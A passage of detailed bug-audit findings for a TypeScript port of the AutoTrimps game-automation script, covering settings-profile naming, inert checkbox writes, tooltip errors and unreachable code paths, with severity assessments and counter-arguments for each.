**Trigger.** Dropdown → "Save New…" → confirm with the name box left empty (or type a name that already exists), then later select that profile and confirm the switch.

**Actual.** `var profname = byId("setSettingsNameTooltip").value.replace(/[\n\r]/gm, ""); if (profname == null) { debug("Error in naming, the string is empty."); return; }` — a textarea's `.value` is always a string, and `'' == null` is false, so the branch is dead and an empty (or whitespace-only) name is stored and added to the dropdown as a blank row. There is also no uniqueness check, while confirmedSwitchNow (:100-104) resolves a selection by NAME (`filter(elem => elem.name == profname)` then `results[0]`), so the second profile sharing a name can never be loaded — and once the first is deleted, selecting the survivor matches nothing and the confirm silently does nothing.

**Expected.** Test the string, not null: reject when `profname.trim() === ''`, and reject (or disambiguate) a name that already exists in the stored array — otherwise the by-name lookup in confirmedSwitchNow is not a function of the user's selection.

**Impact.** Default-path UI, ungated by any setting — `settingsProfileMakeGUI()` runs unconditionally from settings-defs.ts:3010, so the Settings Profile dropdown is present for every user on the Import/Export tab. But it is manual-action-only: nothing fires unless the user saves a profile, so it is invisible to the sim corpus and to every existing test.

Severity is moderate and narrower than the finder framed it:
- REAL data-inaccessibility: a profile saved under a name with a leading/trailing space or a doubled internal space (e.g. "Zone 60 ") is written to localStorage, appears in the dropdown, and can then NEVER be loaded — the confirm button does nothing, with no error, permanently across reloads. This is the one that costs a user a saved settings profile, and a single trailing space triggers it.
- LOWER than claimed: a duplicate name shadows rather than destroys (deleting the first makes the second loadable), and an empty name yields only a blank dropdown row, not an unloadable profile.
- The dead guard at :115 is cosmetic on its own; its value is as the evidence of intent (and as the natural place to put the fix).

Not a candidate for the differential net — it terminates in localStorage and DOM, never in a wrapped native mutator, so no trace moves and `baseline-zero` stays green either way.

**Strongest counter-argument considered.** Three real counters, one of which lands.

(a) LANDS — the finder's severity clause is FALSE. "Once the first is deleted, selecting the survivor matches nothing and the confirm silently does nothing" does not happen. `onDeleteProfile` splices `oldpresets[index-3]` (:160-161), which is the correct index mapping past the three fixed rows, so deleting the first "Farm" leaves `[{"name":"Farm","data":{"marker":2}}]` in store and the survivor row then loads marker 2 correctly. Verified. So a duplicate name is recoverable *shadowing*, not permanent loss — the finder overstated it.

(b) PARTLY LANDS — the truly-EMPTY name is not unloadable either. `"" == ""`, so an empty-name profile stores, renders as a blank row, and loads back fine. The dead guard on its own therefore costs a cosmetically blank dropdown row, nothing more. The permanently-unloadable case is whitespace-BEARING, not empty — the finder conflated the two.

(c) DOES NOT LAND — "faithful to legacy, so it is intended." The pre-conversion file is byte-identical, so it is not a regression, but the debug string names the rejection the code fails to perform, and this repo has repeatedly shipped fixes for exactly this class of inherited defect in this very file (#71a, #76, #102), each with a comment explaining why faithfulness was not a defence.

One caveat I could not close: the `option.text` strip-and-collapse was verified in jsdom (which implements the HTML Standard text verbatim) and from the spec, not driven in Chrome this session — the instructions were read-only and the game is not served.

---

### #175's inert advPerfectCheckbox has four more sites here, and one of them kills the FIRST rung of the shared U2 fragment-affordability ladder (RminFragMap)

`src/modules/mapfunctions.ts:341`

**Sim-visible?** No. RminFragMap and RfragMap are reachable only through the U2 farm modules, all default-off; note also that `Rshouldfragfarm` has exactly one writer (RfragCalc, called only from RsmithyFarmMap:576), so even plain frag-farming is gated behind Smithy Farming.

**Trigger.** Any U2 farm that prices a map through RminFragMap — insanity (915/919), ship (1112/1116), alch (1248), hypo (1398/1402/1406), and RfragCheck (427) — whenever the max-slider map costs more than the player's fragments.

**Actual.** `advPerfectCheckbox` is a `<span class="niceCheckbox" data-checked="false">` (.trimps-game/index.html:897), not an `<input>`. `readNiceCheckbox(elem)` returns `elem.dataset.checked == "true"` (updates.js:1958-1960). Assigning `.checked` creates a JS expando the game never reads, so lines 276, 285, 331 and 341 are all no-ops. The consequence specific to this file: RminFragMap's "Nobody's perfect" step (340-346) sets `checked = false`, re-reads `updateMapCost(true)`, and tests it against the same fragment count — but the perfect state did not change, so the cost is bit-identical and the inner `if (updateMapCost(true) <= owned)` at 343 can never be true. It is an unreachable fallback, and it is the FIRST and cheapest rung AT tries (perfect adds +6 to baseCost, and baseCost is exponentiated by 1.14^baseCost — 1.14^6 = 2.19x). AT instead skips straight to shredding loot, then size, then difficulty. Symmetrically, RfragMap:276 and RminFragMap:331 never actually turn perfect ON, so AT's farm maps are only ever perfect if the user happened to leave the real checkbox checked.

**Expected.** Route through the game's own setter — `swapNiceCheckbox(byId('advPerfectCheckbox'), true/false)` (main.js:6134 uses exactly this) — or write `dataset.checked`. Same fix as #175, four more call sites.

**Impact.** LOW — opt-in, U2-challenge-only, structurally invisible to the proof net. Not default-path.

REACHABILITY, verified per caller:
- mapfunctions.ts:427 (RfragCheck) runs RminFragMap only `if (frag)`, where frag is Rinsanityfarmfrag / Rshipfarmfrag / Ralchfarmfrag / Rhypofarmfrag — all `createSetting(..., 'boolean', false, ...)` (settings-defs.ts:2050, 1038, 2123, 2162).
- settings-visibility.ts:416/694/718/727 gates every one behind `radonon` AND the parent challenge toggle (Rinsanityon / Ralchon / Rhypoon / Rshipfarmon, all default false); 780-819 hard turnOff otherwise. Runtime gate and render gate are the same invariant twice.
- The RinsanityMap sites (915/919) carry an EXTRA closed gate: line 911 `getPageSetting('Rinsanityfarmlevel') != 0`, and the default is multiValue `[0]`; `[0] != 0` evaluates to **false** (verified in node). Dead by default even before the frag toggle.
- RfragMap (276/285) is reachable only via `Rshouldfragfarm`, which has exactly ONE writer — RfragCalc (mapfunctions.ts:303-305) — called from exactly ONE site, RsmithyFarmMap:576. `Rsmithyfarm` is `boolean` default false (settings-defs.ts:1504-1507). So even plain fragment farming is gated behind Smithy Farming.

SIM VISIBILITY: none. Only ONE at-settings override file exists in the corpus (tests/fixtures/at-settings/p18-z2-balance-stall.json) and it has Rhypoon / Rhypofarmfrag / Rinsanityon / Rinsanityfarmfrag / Rshipfarmfrag / Ralchfarmfrag / Rsmithyfarm all false; every other fixture — including 10-hypo-u2 and 04-u2-radon — runs AT defaults, which are the same falses. RminFragMap is never entered by any of the 12 fixtures, so baseline-zero is not evidence here.

WHO IS HURT: a U2 player who has explicitly turned on Insanity / Ship / Alchemy / Hypothermia farming past z30 (U2 perfect unlock). Two symptoms, both quality-of-map, neither a hang:
 (a) default `data-checked="false"` — every farm map is built with RANDOMIZED loot/size/difficulty instead of perfect (loot -1.91%, size +10.00% cells, difficulty +6.00%), while AT pays 2.35x less than the code intends. This is the wider half and it hits 100% of such players.
 (b) player has ticked the real checkbox — the imperfect fallback is skipped and AT lands one notch lower on the loot slider (E[loot] 1.540 vs 1.570, -1.91%).

FIX SCOPE: same one-line seam as #175 — `swapNiceCheckbox(byId('advPerfectCheckbox'), true|false)` (updates.js:1932-1943), which is exactly what the game itself uses at main.js:6134. Four sites here; the three mapfunctions-amp.ts sites need no fix (already doubly dead via loot=0). RECOMMEND folding into #175 rather than filing separately — #175's Evidence paragraph already names these four line numbers.

**Strongest counter-argument considered.** Two, and the first genuinely lands on severity:

1. THE LADDER SELF-HEALS, SO THE DEAD RUNG COSTS ALMOST NOTHING. For the default player (`data-checked="false"`), rung 1 at line 335 already computes and returns the imperfect price, so the dead rung at 340-346 is redundant, not harmful — AT is never stuck and in fact pays 2.35x less per map, which for a routine whose entire purpose is FRAGMENT farming is arguably the better trade. For the ticked-checkbox player, the loot loop's first iteration drops the slider sum from 27 to 26, which makes `checkSlidersForPerfect()` force perfect off anyway one rung later at a LOWER price (6.1798e7 vs the skipped 6.8674e7). So the whole observable consequence is E[loot] 1.540 instead of 1.570 — a 1.91% loot loss on an opt-in U2 challenge farm. That is not the "kills the ladder" defect the title claims.

2. IT IS BYTE-FAITHFUL TO LEGACY AND WAS CORRECT WHEN WRITTEN. `git show d283f152:legacy/modules/mapfunctions.js:301/310/356/366` is character-identical, and Trimps v4.6 shipped `advPerfectCheckbox` as a real `<input type="checkbox">` — so this is not conversion drift and not a bug the AT authors introduced.

Neither refutes existence. Counter 1 bears purely on severity (the branch is still provably unreachable and perfect is still never enabled — the code does not do what it says). Counter 2 is provenance, and CLAUDE.md's own filter is "faithful-to-legacy-INTENDED vs genuine defect": the `//Nobodys perfect` comment plus the 30-rung degradation ladder make the intent unambiguous, so this is inherited, not intended.

A third counter I checked and REJECTED: "perfect is locked at these zones anyway." `getUnlockZone('perfect')` is 29 for U2 (main.js:6171-6186), and all four callers are deep-U2 challenge farms, so perfect is unlocked wherever this code runs. It does NOT save the finding.

---

### getPotencyMod is missing the Archaeology and Quagmire breed multipliers the game applies and both breedtimer copies already mirror

`src/modules/query.ts:233`

**Sim-visible?** No. Same reason as the quickTrimps finding — `getPotencyMod` terminates only in a tooltip string, never in a wrapped native mutator, and the corpus contains no Archaeology or Quagmire fixture.

**Trigger.** Hover the Army Count control (breedtimer.ts:229 → `getArmyTime()` → `getPotencyMod()`) while the Archaeology or Quagmire challenge is active.

**Actual.** `getPotencyMod` (query.ts:233-271) applies potency, Potency book, Nursery, Venimp, broken planet, Pheromones, Quick Trimps, daily dysfunctional/toxic, Toxicity stacks, slowBreed, Geneticists and the Shield heirloom — but never `game.challenges.Archaeology.getStatMult('breed')` or `game.challenges.Quagmire.getExhaustMult()`. It also reads `game.portal.Pheromones.level` directly (query.ts:244) rather than `getPerkLevel('Pheromones')`, so in Universe 2 it uses the U1 level and ignores `radLevel`.

**Expected.** Mirror the game's breed calculation. .trimps-game/main.js:5629-5630 applies `chalArchaeology` and `chalQuagmire`; main.js:5594 uses `getPerkLevel('Pheromones')`. AT's own #22 parity fix already added both challenge multipliers to the two sibling copies of this formula — breedtimer.ts:66-69 and breedtimer.ts:126-127, each carrying the comment "Archaeology / Quagmire (parity fix #22): mirror game breed() challenge mults (main.js 5629-5630)". query.ts's fourth copy was not updated.

**Impact.** DEFAULT PATH but DISPLAY-ONLY — a wrong number in a hover tooltip, never an automation decision. LOW severity, real.

Who is affected: `showbreedtimer` defaults to `true` (settings-defs.ts:2889), so `addToolTipToArmyCount()` runs for every user on every tick, in both universes. The wrong value is computed only when the user hovers the Army Count element.

Blast radius by state:
- U1, any zone: NO drift. Archaeology and Quagmire are `blockU1: true`; `getPerkLevel` returns `.level` in U1, matching query.ts:244. query.ts's getPotencyMod is correct in U1.
- U2, no challenge: Pheromones drift only — 11.00 vs 3.00 for a level=100/radLevel=20 player (+267% overstated breed rate → tooltip understates seconds by ~3.7x). Shared with breedtimer.ts:47/:112, so not unique to this file.
- U2, Archaeology active: compounding. 20 breed relics → AT/game = 0.5450x; 50 relics → 117x on that term alone.
- U2, Quagmire active: worst case. 30 stacks in the world → AT/game = 86.5x; the tooltip reads 7.56s where truth is 178.33s.

Guardedness: effectively unguarded. `getPotencyMod` terminates in a tooltip string, never in a wrapped native mutator (buyJob/buyBuilding/buyUpgrade/buyEquipment/buyMap/selectMap/runMap/recycleMap/recycleBelow/setFormation/setGather), so the L0 differential is structurally blind to it. The corpus additionally contains no Archaeology or Quagmire fixture, so even the sim-visible sibling fix in breedtimer.ts (which reaches setGather via gather.ts:80-81) is unmeasured for these two multipliers. `baseline-zero` is not evidence here in either direction.

No gameplay risk from a fix: the game defines no `getPotencyMod`/`getArmyTime`, so the bridge is not shadowing native code, and correcting the mirror changes no balance number — it makes AT agree with `.trimps-game/main.js:5629-5630` and `main.js:5594`, which is the same class of change #22 already shipped.

**Strongest counter-argument considered.** The strongest refutation — and it survives as a severity cap, not a kill — is that `getPotencyMod` is a pure display helper. Its only terminal consumer is a tooltip string; nothing in AT branches on it, no native mutator is downstream, and no automation decision changes. Contrast the sibling that #22 fixed: breedtimer's `potencyMod()` feeds `breedingPS()` and `breedTimeRemaining()`, which gather.ts:80-81 uses for `trappingIsRelevant` / `trapWontBeWasted` — an actuator path terminating in `setGather`. So #22 had actuator justification that query.ts's copy does not. One could argue query.ts was skipped deliberately for that reason.

Three things stop this from refuting the claim. (a) The #22 commit carries no such rationale — no comment, no issue note, and query.ts simply is not in `git show --stat da366a3d`; "deliberately skipped" is an inference with zero supporting artifact, while "the third copy was missed" matches the observed pattern exactly. (b) The tooltip is a factual claim to the user about the game's breed rate; being off by 86x is a defect by the repo's own "tooltips are evidence" standard. (c) The formula-copy divergence is itself the hazard — three copies of one game formula, two patched and one not, is how the next consumer of `getPotencyMod` silently inherits stale math.

Two weaker counters I checked and broke: "the multipliers are 1 anyway" — true only at challenge start (Archaeology points.breed=0, Quagmire exhaustedStacks=0 both yield 1.0), but Quagmire gains a stack per zone by design and Archaeology relics are the challenge's whole mechanic, so both leave 1.0 within a zone or two. And "`game.global.challengeActive === '...'` vs `challengeActive(...)` complicates the fix" — no: `game.global.multiChallenge` is populated only from the six U1 combo lists at config.js:4135-4185, neither challenge appears in any of them, and both carry `allowSquared: false`, so the two idioms are exactly equivalent here.

---

### carmormagic / Rcarmormagic help text names the wrong setting for its H:D mode

`src/modules/settings-defs.ts:675`

**Sim-visible?** No. Tooltip prose is not executable and produces no trace events at all.

**Trigger.** A user reading the "C2 Armor Magic" tooltip who then goes and tunes the setting it names.

**Actual.** settings-defs.ts:675 (and :680 for `Rcarmormagic`) says the H:D mode fires "once your H:D ratio ... is at or above the cutoff you set in <b>Mapology H:D</b>". "Mapology H:D" is the label of `mapc2hd` (settings-defs.ts:684), a Mapology-Challenge² override. The code reads a different setting: other.ts:234 uses `getPageSetting('MapDamageCutoff')` and other.ts:327 uses `getPageSetting('RMapDamageCutoff')` — both labelled "Map Cut Off". Tuning `mapc2hd` changes nothing here; `carmormagic` only ever runs on Toxicity/Nom, never Mapology, so `mapc2hd` could not be the intended source.

**Expected.** Name "Map Cut Off" (`MapDamageCutoff` / `RMapDamageCutoff`), as the Daily twins already do — settings-defs.ts:239 says "the H:D cutoff set in the Maps tab" — and as `MapDamageCutoff`'s own tooltip asserts from the other direction: "This same threshold is also what the <b>CAM: H:D</b> Armor Magic option compares against" (settings-defs.ts:1266).

**Impact.** **Opt-in setting, documentation-only defect, LOW severity — but a real user-misdirection with an aggravating layout.**

Both toggles are `multitoggle` with default `0` (Off): settings-defs.ts:673 (`carmormagic`) and :678 (`Rcarmormagic`). The misdescribed mode is value `2` ("CAM: H:D"). Neither of the two shipped preset blobs in utils.ts:51/54 selects `2` (they carry `carmormagic: 1` and `carmormagic: 3`), so this is squarely opt-in.

Who is affected: every user who *hovers* the C2 Armor Magic control reads the wrong sentence; the subset who then select CAM: H:D and try to tune it get a guaranteed-zero-effect knob. In U1 the named control renders two rows below (settings-visibility.ts:322/324, both `!radonon`), which makes the misdirection maximally believable — the user finds a box literally labelled "Mapology H:D" right there. In U2 it is strictly worse: `Rcarmormagic` renders (line 323, `radonon`) while `mapc2hd` is turned off (line 324, `!radonon`) and has no U2 reader at all, so the tooltip sends a U2 player hunting for a control that is not on screen.

No runtime behaviour changes; no trace events; correctly invisible to the proof net. Zero regression risk to fix — it is a prose edit at settings-defs.ts:675 and :680, replacing `<b>Mapology H:D</b>` with `<b>Map Cut Off</b>` (or the Daily twins' existing phrasing, "the H:D cutoff set in the Maps tab"), which also resolves the live contradiction with settings-defs.ts:1266.

**Strongest counter-argument considered.** The strongest attack is inverting it: **the code, not the prose, is the wrong artifact.** `other.ts:225-231` documents that #70 *repointed* this arm — it originally compared against `MODULES["maps"].enoughDamageCutoff`, which nothing ever assigns, making the arm dead. If the original author's intent had been the Mapology cutoff, then #70 repointed to the wrong setting and the tooltip is the surviving record of true intent. That would make the fix a code change, not a prose change.

This is refuted decisively by reachability rather than by preference: `armormagic()` is only ever called during Toxicity/Nom (or a Daily), and `mapc2hd` is only ever consulted under `game.global.challengeActive == "Mapology"` — and Mapology (Topology: Balance+Mapology) and Toxicity (Toxad: Toxicity+Lead) are different C² runs that cannot be simultaneously active. `mapc2hd` could not have been the source under any state. Additionally it writes only an `autoMap()` local, so even a hypothetical co-active state would not change what `getPageSetting('MapDamageCutoff')` returns. `MapDamageCutoff` is independently confirmed as the right units: maps.ts:408's `ourBaseDamage * MapDamageCutoff > enemyHealth` rearranges to `HD < MapDamageCutoff`, and maps.ts:975 literally compares `RcalcHDratio()` to `RMapDamageCutoff` in production.

Second-strongest: "it is only prose, so not a defect." Weak here — the repo's own precedent (the #111–#119 tooltip audit, which surfaced 9 real bugs) treats a description promising behaviour the code does not implement as a finding, and the harm is concrete: the named box is real, live, adjacent, and provably inert for this purpose.

Third: "unreachable because the setting is off by default." True but it lowers impact, not reality — the tooltip renders on hover regardless of the toggle's value.

---

### The multitoggle cycle counter renders "(01/3)" for the four settings whose declared default is the STRING '0'

`src/modules/settings-engine.ts:50`

**Sim-visible?** No, twice over: it is DOM label text (the L0 oracle records actions, not labels), and the every-tick refresh that re-renders it runs inside updateCustomButtons, which is guiLoop-driven and therefore structurally invisible to the net (setInterval is stubbed dead in scripts/sim/boot.mjs).

**Trigger.** Any user who has never clicked dfightforever, Rdfightforever, AutoPortalDaily or RAutoPortalDaily — i.e. every fresh install, on all four controls, from mount onward.

**Actual.** createSetting stores the default verbatim (`value: loaded === undefined ? defaultValue || 0 : loaded`, line 298) and clampMultitoggle deliberately leaves an in-range value byte-identical (lines 73-77, 80), so `.value` stays the string '0'. renderControlFace line 50 then evaluates `'(' + (rec.value + 1) + '/' + rec.name.length + ')'`, and `'0' + 1` is the STRING '01' — so the badge reads (01/3) instead of (1/3) on all four (each has exactly 3 options: settings-defs.ts:228, 393, 568, 619). It self-corrects only after the first click, because settingChanged's `btn.value++` (line 357) coerces to a number.

**Expected.** `Number(rec.value) + 1`. The four string defaults are already pinned by tests/nets/dispatch-holes.test.ts:558-566, but that net's stated consequence is only "any code reading autoTrimpSettings[id].value with === sees a string" — the visible counter corruption is not covered there.

**Impact.** DEFAULT PATH, but cosmetic only.

Who: every user who has never clicked the control — i.e. every fresh install, and every existing user who left these four at their defaults. Not opt-in, not gated behind a deep zone, not universe-restricted (the defect is symmetric across the U1 pair and the U2 pair). radonsettings defaults to numeric 0, so the U1 pair (dfightforever, AutoPortalDaily) is the pair rendered on the default Daily tab; flipping the view to Radon shows the equally-broken R-pair.

How badly: the cycle-position badge reads "(01/3)" instead of "(1/3)". It is written at mount (settings-engine.ts:306) and repainted every tick by updateCustomButtons (settings-visibility.ts:1070), and it survives reloads because serializeSettings persists the string. It self-corrects permanently on the user's first click of that control, since settingChanged's `btn.value++` coerces to a number.

No behavioural impact whatsoever: all ten consumer sites read through getPageSetting, which parseInt()s multitoggles (utils.ts:71). The state class ('settingBtn0') and the option label are also correct. Automation decisions are unaffected.

Sim-visibility: the finder's assessment is correct and I confirmed both halves. L0 records native mutator calls, not DOM text; and the repaint path runs inside guiLoop, which never executes in the proof net (setInterval stubbed at scripts/sim/boot.mjs:31). baseline-zero is not evidence about this code either way.

Fix is one token at settings-engine.ts:50 — `Number(rec.value) + 1` — which changes no stored value, writes nothing to localStorage, and cannot move an oracle trace. It also does not require touching the four declarations, so it sidesteps the serializeSettings concern that motivated leaving the string defaults alone.

**Strongest counter-argument considered.** The four string defaults are already known and were DELIBERATELY left un-normalized. clampMultitoggle's comment (settings-engine.ts:73-77) names all four by id and says normalizing them "would change what serializeSettings() writes for every user, which is a separate decision from closing this hole," and tests/nets/dispatch-holes.test.ts:557-566 pins the exact set so a fifth one fails on arrival. So a reviewer could fairly say this is filed debt, not a new finding.

That argument does not survive contact with the detail. Both existing records state the consequence as exactly one thing: "any code reading autoTrimpSettings[id].value with === sees a string." Neither notices that renderControlFace — added LATER, in #39, four months after those comments' reasoning was set down — reads `.value` with `+`, which is not an `===` comparison and produces user-visible corruption rather than a latent type smell. The two artifacts describe the cause correctly and the effect incompletely.

More decisively, the stated reason for deferring is that normalizing the stored value would alter what serializeSettings writes for every existing user. That reason does not protect line 50 at all: `Number(rec.value) + 1` is a pure render-site fix that touches no stored value, writes nothing to localStorage, and moves zero oracle traces. The deferral rationale and this defect are simply about different lines.

The honest weakness that remains is severity, not existence: it is a badge reading "(01/3)" instead of "(1/3)". No behaviour changes, because every consumer parseInt()s. Anyone triaging this should treat it as a real, fully reproduced, zero-risk cosmetic defect — not as evidence of a behavioural bug.

---

### toggleAutoMaps treats the 3-state AutoMaps multitoggle as a boolean, so one off/on cycle of the battle-screen button silently downgrades "Unique" mode to plain "On"

`src/modules/settings-menu.ts:280`

**Sim-visible?** No. It requires a click on a UI button; the sim never dispatches one, and the fixtures' AutoMaps value is whatever their saved settings hold.

**Trigger.** AutoMaps set to 2 ("Auto Maps: Unique"), then click the "Auto Maps" button that automationMenuInit adds to #battleBtnsColumn (settings-menu.ts:37) twice. Mirror case at line 288 for U2 RAutoMaps ("Auto Maps No Unique").

**Actual.** `if (getPageSetting('AutoMaps')) setPageSetting('AutoMaps', 0); else setPageSetting('AutoMaps', 1);` — getPageSetting returns parseInt, so 2 is truthy and the first click writes 0; the second writes 1, not 2. The user's mode is gone with no message. It matters: five behaviours are gated on exactly `== 2` (maps.ts:166-170 — AMUblock, AMUtrimple, AMUprison, AMUbw, AMUstar), and the U2 twin inverts it (`runUniques = getPageSetting('RAutoMaps') == 1`, maps.ts:1322), so the same two clicks turn uniques ON for a U2 player who had them off.

**Expected.** Restore the previous non-zero value on the off→on transition (or cycle 0→1→2 like settingChanged does), rather than hard-coding 1. Note this is byte-faithful to the pre-conversion source (oracle line 15578-15596), so it is pre-existing, not a conversion regression.

**Impact.** OPT-IN SETTING, EASY TRIGGER, SILENT LOSS — moderate. Not the default path.

Preconditions: U1 player who has cycled the settings-panel `AutoMaps` box to value 2, "Auto Maps: Unique" (default is 1). Once there, the trigger is trivially routine: `#autoMapBtn` sits in `#battleBtnsColumn`, immediately beside the fight buttons — the most-clicked region of the screen — and "turn automapping off to do something by hand, then turn it back on" is ordinary play. Two clicks and the mode is gone.

Severity gradient:
- Always, on any mode-2 user: the mode is lost and the five AMU* controls VANISH from the settings panel (settings-visibility.ts:460-464 flips turnOn→turnOff). Recovery requires knowing to reopen the panel and click the AutoMaps box twice. No message, no debug line, no visual cue beyond the button class changing to settingBtn1. `saveSettings()` on line 295 persists the downgrade immediately, and `clampMultitoggle` happily accepts 1 on the next reload — so it is permanent, not a session glitch.
- Behavioural loss requires a SECOND opt-in: at least one of AMUblock/AMUtrimple/AMUprison/AMUbw/AMUstar set true (all default false). Then maps.ts:166-170 goes false and AT stops force-running that unique map (The Block / Trimple Of Doom / The Prison / Bionic Wonderland / the star map) — a real map-selection change that terminates in the wrapped `selectMap`/`runMap` natives.
- Compounding case: a mode-2 U1 user who also uses Praiding or BW-raid. other-praiding.ts:997 and :1424 gate the raid hand-off on `== 1`, so at value 2 AT never hands off; and once the value is 1, the "Turning AutoMaps back on" restores at :1305 and :1369 hard-code `value = 1`, so the mode can never climb back on its own.

U2 (`RAutoMaps`): I am NOT counting this as impact — see the counter-argument. Same two clicks flip `runUniques` (maps.ts:1322) from false to true for a player who chose "No Unique", but that is the 2018 design intent, still intact for U2's unchanged semantics.

Proof-net exposure: ZERO, permanently. `toggleAutoMaps`'s only caller is an inline `onClick` attribute string; `scripts/sim/` never dispatches a click and never references `autoMapBtn`. baseline-zero is not evidence about this code — it cannot see it. Deepest fixture z62 is irrelevant; the gate is the click, not the zone.

**Strongest counter-argument considered.** The two-state button is a documented, deliberate upstream decision, not an oversight: commit 1de4737d (2018-03-23) is literally titled "toggleAutoMaps to go back to On/Off not three way." and replaced the three-way `settingChanged('AutoMaps')` handler with this exact body. So "the button doesn't reach state 2" is working as designed, and the button's own tooltip ("Toggle automapping on and off") advertises two states.

For U2 this counter-argument is decisive and I accept it — `RAutoMaps` value 2 is still "No Unique", the same restriction-semantics the 2018 decision was made under, so the U2 half of the claim is REFUTED as intended behaviour.

For U1 it is not decisive, because the premise the decision rested on was silently inverted in 2022 (de12d635) — but a reviewer could still argue the button's ARITY remains intentional and only the round-trip's lossiness is at issue, which is a narrower defect than "treats a 3-state as a boolean".

Two further impact-dampeners I could not dismiss: (a) all five AMU* booleans default `false` (settings-defs.ts:1194, 1204, 1210, 1218, 1223), so a mode-2 user who checked no AMU box loses zero map-selection behaviour at the moment of the downgrade — the loss is the mode plus the five now-hidden controls; (b) AutoMaps default is 1, so this needs a deliberate opt-in via the settings panel before it can bite at all, and I have no way to measure how many players use mode 2.

---

### Eleven `Rchallengehide*` descriptions claim they are ignored while the master switch is off; the code applies them unconditionally

`src/modules/settings-visibility.ts:752`

**Sim-visible?** No. U2 settings-page visibility only, in guiLoop-only code; the corpus has no U2 challenge fixture exercising these.

**Trigger.** U2 settings view: turn `Rchallengehide` ("Hide Stuff") ON, tick e.g. `Rchallengehidequag`, then turn `Rchallengehide` back OFF.

**Actual.** The eleven hide blocks at lines 752-830 test only the sub-toggle (`if (getPageSetting('Rchallengehidequag') == true) { turnOff("Rblackbog"); ... }`) and run after the corresponding turnOn at lines 661-736, so the turnOff wins. Turning the master off therefore does NOT restore the hidden challenge settings — it only hides the eleven sub-toggles (lines 740-750), leaving the user with challenge panels that are gone and no visible control to bring them back.

**Expected.** The descriptions and the code must agree. `Rchallengehidequag`'s tooltip says `ignoredWhen: 'Universe 1, or while Hide Stuff above is off (this toggle is itself hidden then).'` (settings-defs.ts:1874) — repeated verbatim for all eleven — while the master's own tooltip says the opposite: "Turn it off again once you've set the individual hide toggles you want" (settings-defs.ts:1869). The code matches the master's tooltip, so the eleven sub-tooltips are the wrong half.

**Impact.** LOW severity, opt-in, cosmetic, and unguarded.

Reachability chain, all three gates default-off: (a) `radonsettings` is a `multitoggle` defaulting to **0** (Helium/U1) — settings-defs.ts:210-213 — so the Challenges tab renders only for a user who has flipped the settings view to Radon; (b) `Rchallengehide` is `'boolean', false`; (c) each of the eleven sub-toggles is `'boolean', false`. A user must deliberately turn the master on, tick a sub-toggle, then turn the master off to reach the state.

No automation behaviour changes — `grep -rn 'Rchallengehide' src/` returns hits only in settings-defs.ts and settings-visibility.ts, so the master is a pure reveal switch and the sub-toggles only drive `style.display`. Nothing in AT's decision-making reads them; no native mutator is affected.

Harm is misinformation, not damage: a U2 user reads "Ignored: ... while Hide Stuff above is off", concludes hiding is a preview that lapses when the master goes down, turns the master off, and finds the challenge panels still gone with the eleven sub-toggles no longer on screen. Recoverable in two clicks (the master stays visible), so at worst a few minutes of "where did my Quagmire settings go" — but that is exactly the class of confusion the #107 tooltip pass exists to eliminate, and it is duplicated verbatim eleven times.

Proof-net visibility: none. This is guiLoop-only code (`updateCustomButtons`), which never runs in the L0 net because scripts/sim/boot.mjs stubs `setInterval`. `baseline-zero` is not evidence here in either direction, and the corpus has no U2 challenge fixture regardless. The region is effectively unguarded except by the tooltip nets, which today check compilability (tests/nets/settings-tooltips.test.ts) and census coverage, not semantic truth.

**Strongest counter-argument considered.** Three attempts to break it, one of which lands partially:

1. LANDS — "the code is the bug" is wrong. `git show d283f152:legacy/SettingsGUI.js` lines 2225-2255 are character-for-character the same structure: the same eleven `radonon && getPageSetting('Rchallengehide') == true ?` reveals followed by the same eleven master-free `if (getPageSetting('Rchallengehide<x>') == true) { turnOff(...) }` blocks. And the legacy master description was "Enable seeing the hide challenges buttons. Feel free to turn this off once you are done." — i.e. persist-after-master-off was the ORIGINAL design intent, not an accident. So anyone who "fixed" settings-visibility.ts:752 by adding a `getPageSetting('Rchallengehide') &&` term would be deleting the feature (the whole point is to tuck panels away and then put the reveal switch back down). The claim's `expected` says "the descriptions and the code must agree", which is right, but its `actual` reads as a code indictment; only the doc is wrong.

2. LANDS — "no visible control to bring them back" is false. :739 turns the master ON unconditionally whenever `radonon`, confirmed in the simulation (`Rchallengehide -> ""` in the master-OFF row). Recovery is two clicks: master ON reveals the sub-toggles, untick the sub-toggle. That caps severity at "confusing", not "settings lost".

3. DOES NOT LAND — "the parenthetical rescues it". One could argue "(this toggle is itself hidden then)" tells the reader the toggle is merely unreachable rather than inert. But the facet's own docstring says "does nothing at all", the rendered prefix is the bare word "Ignored:", and the sentence puts "while Hide Stuff above is off" on equal grammatical footing with "Universe 1" — where the setting genuinely IS inert. A reader takes both clauses to mean the same thing, and for one of them that is false. Two other tooltips (settings-defs.ts:55, :108) append a hidden-ness note to `ignoredWhen`, but in both the setting is genuinely ignored as well, so hidden-ness is supplementary there rather than the whole claim.

Also worth stating plainly: the sim cannot refute or confirm this. `updateCustomButtons` is guiLoop-only and scripts/sim/boot.mjs stubs `setInterval` dead, so the L0 net never executes this function; a green baseline-zero is not evidence about it either way. That is why it survived.

---

### windStance()'s four `calcCurrentStance() === 5` arms are unreachable — calcCurrentStance can never return 5, so the low-heirloom W stance is dead in both the normal and Daily halves

`src/modules/stance.ts:275`

**Sim-visible?** No. windStance() requires AutoStance == 3 or use3daily == true; both are 1 and false respectively in the fixture settings (tests/fixtures/at-settings/p18-z2-balance-stall.json) and in the createSetting defaults, and it additionally requires world > 70 (deepest fixture is z62).

**Trigger.** AutoStance == 3, or use3daily == true during a Daily; game.global.world > 70. Any tick that reaches windStance().

**Actual.** windStance() tests `calcCurrentStance() === 5` at stance.ts:275 (→ stancey 5 + lowHeirloom()) and stance.ts:309 (→ stancey 5 + dlowHeirloom()). calcCurrentStance() (src/modules/calc.ts:883-987, the sole definition — calc.ts:990 records that the duplicate was removed in #51) has exactly five `return` values plus an implicit one: 15 (calc.ts:896), 2 / 0 / 1 from the `!usehigh` branch (calc.ts:963/965/967), 12 / 10 / 11 from the `usehigh` branch (calc.ts:981/983/985), and `undefined` when `ehealth <= 0`. 5 is not among them, so the W-with-low-heirloom stance can never be selected; W is only ever reached through the `=== 15` arm (stance.ts:291/325), which pairs it with highHeirloom()/dhighHeirloom().

**Expected.** Either calcCurrentStance()'s `!usehigh` branch should be able to return 5 (the low-side twin of 15, matching the 10+n encoding the other three pairs use: 15/5, 12/2, 10/0, 11/1), or the four dead arms should be deleted so the encoding does not imply a state the producer cannot emit.

